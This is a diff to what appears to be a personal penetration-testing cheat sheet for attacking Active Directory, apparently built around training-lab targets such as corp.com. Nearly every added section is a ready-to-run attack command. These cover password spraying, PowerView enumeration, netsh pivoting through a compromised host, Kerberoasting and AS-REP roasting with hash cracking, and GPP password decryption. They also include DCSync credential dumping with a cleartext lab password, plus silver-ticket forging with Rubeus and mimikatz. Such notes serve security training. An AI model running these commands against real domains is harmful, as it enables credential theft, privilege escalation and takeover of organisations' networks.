@@ -221,6 +221,12 @@ smbclient //192.168.50.195/share -c 'put config.Library-ms'
 
 ## Password Attacks
 
+Be careful with account lockouts, and always check lockout policy with:
+
+```bat
+net accounts
+```
+
 <details>
 <summary> cewl.rb </summary>
 
@@ -290,6 +296,37 @@ useful hash modes (-m value):
 - 13100: Kerberos RC4 TGS Ticket (denoted by $krb5tgs$23$)
 
 </details>
+
+<details>
+<summary>AD Password Spray</summary>
+
+Conducts password spraying via LDAP
+
+``` bat
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+```
+</details>
+
+<details>
+<summary>crackmapexec</summary>
+
+Authenticates via SMB and notifies you if a valid user is a local admin by adding (Pwn3d!) to the output
+
+``` bash
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+</details>
+
+<details>
+<summary>kerbrute</summary>
+
+Conducts password spraying against kerberos, only uses 2 UDP packets to identify a valid pw
+
+``` bat
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+</details>
+
 
 ## Initial Access
 Ports of interest
@@ -734,6 +771,9 @@ rem show information about a specific user (local or domain)
 net user [username]
 net user [username] /domain
 
+rem chnage a domain user's password
+net user /domain username newpassword
+
 rem list all groups (local or domain)
 net localgroup
 Get-LocalGroup
@@ -829,6 +869,27 @@ If we had the relevant permissions, we could also use MMC to directly make chang
 </details>
 
 <details>
+<summary>active directory enumeration</summary>
+
+```powershell
+# using powerview
+Import-Module PowerView.ps1
+Get-NetDomain
+Get-NetUser username
+Get-NetGroup groupname
+Get-NetComputer | select operatingsystem,dnshostname
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+# spray the environment to find possible local administrative access on computers under the current user context
+Find-LocalAdminAccess
+# get SPNs
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Find-DomainShare
+Find-DomainShare -CheckShareAccess
+```
+
+</details>
+
+<details>
 <summary> impacket </summary>
 
 ``` bash
@@ -865,14 +926,15 @@ seatbelt.exe UAC 'computername=10.140.12.13' -username=company\user -password=pa
 <summary> bloodhound </summary>
 
 ``` bash
+#setup the service 
+sudo neo4j start
+bloodhiound
+
 # using python tooling, remotely retreive AD information for loading into bloodhound
 bloodhound-python -d domain.com -u username -p password -c ALL -ns 10.10.192.2
 
 # using c# tooling (ps1 tooling also available), retreive AD infomation for loading into bloodhound and do not touch domian controllers (better for evasion)
 Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs
-
-# start bloodhound application
-./BloodHound
 ```
 </details>
 
@@ -960,6 +1022,21 @@ socks5 127.0.0.1 9998
 # scan a host that is only accessible via the compromised machine
 proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
 ```
+
+5. Using netsh 
+
+``` bat
+rem create a port forward on port 2222 of a compromised host, and forward it to port 22 on 10.4.50.215 
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+rem no output from the above command, confirm it was created
+netsh interface portproxy show all
+
+rem create a firewall rule to open port 2222 on a compromised host
+
+
+```
+
 </details>
 
 <details>
@@ -1074,9 +1151,15 @@ hashcat -m 5600 /pcredz/logs/NTLMv2.txt passwords.txt
 <details>
 <summary> kerberoast </summary>
 
+A service ticket is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.
+
+Note, if we control an account with GenericWrite or GenericAll permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
+
 ``` bash
 # find user accounts (not computer accounts) who have registered SPNs (or get them from bloodhound)
 GetUserSPNs.py domain.com/username:password -request -dc-ip 10.120.2.59 > spns.txt
+
+# NOTE: If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
 
 # extract just the TGS tickets from the GetUserSPNs output
 grep krb5tgs spns.txt > tgs.txt
@@ -1084,6 +1167,34 @@ grep krb5tgs spns.txt > tgs.txt
 # GetUserSPNs will provide the TGS ticket, which can be cracked with hashcat (in this case prepend password guesses with a single digit)
 hashcat -m 13100 -a 7 tgs.txt ?d rockyou.txt
 ```
+
+same thing with rubeus
+
+``` bat
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+</details>
+
+<details>
+<summary>AS-REP Roasting</summary>
+
+Identify accounts with "Do not require Kerberos preauthentication" setting so that we can send an AS-REQ as the user, obtain the AS-REP, and crack their password offline.
+
+Note, if we control an account with GenericWrite or GenericAll permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication in order to perform AS-REP Roasting. This attack is known as Targeted AS-REP Roasting. 
+
+``` bash
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/user:password
+
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+same thing using rubeus
+
+``` bat
+.\Rubeus.exe asreproast /nowrap
+```
+
 </details>
 
 <details>
@@ -1298,6 +1409,11 @@ msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows
 # find cpassword under the sysvol share in any xml file
 Get-ChildItem -Path "$env:LOGONSERVER\sysvol" -Filter *.xml -Recurse | Select-String "cpassword"
 ```
+
+``` bash
+gpp-decrypt ENCRYPTED_PASSWORD
+```
+
 </details>
 
 <details>
@@ -1354,10 +1470,20 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 <details>
 <summary> DCSync </summary>
 
+The DRS Remote Protocol lets domain controllers replicate without verifying the request source, only the requester’s rights. Users with replication rights (Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set) which are granted by default to Domain/Enterprise Admins and Administrators can launch a DCSync attack to impersonate a domain controller and extract credentials.
+
 ``` bat
-rem using mimikatz, extract the krbtgt hash via replication using the Directory Replication Service Remote (DRSR) Protocol
+rem using mimikatz, extract the krbtgt hash via replication using the Directory Replication Service Remote (DRSR) Protocol. In this case, you can retrieve any domain user, not just krbtgt
 lsadump::dcsync /user:krbtgt
 ```
+
+using impacket
+
+``` bash
+# impacket will use DRSUAPI, the Microsoft API implementing the Directory Replication Service Remote Protocol, in order to get NTDS.DIT secrets
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+
 </details>
 
 <details>
@@ -1422,28 +1548,54 @@ wmiexec.py -k -no-pass -dc-ip 10.20.10.10 file01.domain.com hostname
 <details>
 <summary> silver ticket </summary>
 
+Due to how tickets are constructed and validated, we can contruct our own valid ticket for a specific SPN if we have the following information:
+
+1. Password or hash for the SPN's account
+2. domain SID
+3. The target SPN
+
 ``` bat
-rem like above, obtain the domain SID
+rem obtain the domain SID
 lookupsid.py domain.com/username:'password'@10.20.10.10 520
 
 rem in this case, we want to obtain the aes256 hash for a computer account (in this case file01$)
 secretsdump.py domain.com/username:password@10.20.10.10 -just-dc-user file01$
 
 rem using rubeus (could also use ticketer) generate the ticket for the SMB service on the fileserver
-Rubeus.exe sliver /service:cifs/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:username
+Rubeus.exe silver /service:cifs/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:username
 
 rem ensure the kerberos ticket has been loaded into local memory 
 klist
 
-rem now, try to hit access the server
+rem now, try to access the server
 dir \\file01.domain.com\c$
 
 rem in this example, we can instead forge a ticket for a different "serviceclass" (we did cifs before) that lets us query the target's event logs using an arbitrary username and user id
-Rubeus.exe sliver /service:host/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:anything /id:777
+Rubeus.exe silver /service:host/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:anything /id:777
 
 rem now query the event logs
 wevutil /r:file01.domain.com qe Security "/q:*[System/EventID=4624] and *[EventData/Data[@Name='TargetUserName'='anything']" /f:text /c:1
+```
 
+using mimikatz:
+
+```bat
+rem dump password hashes 
+privilege::debug
+sekurlsa::logonpasswords
+
+rem obtain SID
+whoami /user
+
+rem forge the ticket
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+rem confirm ticket has been loaded into memory 
+exit
+klist 
+
+rem confirm access to service
+iwr -UseDefaultCredentials http://web04
 ```
 
 </details>
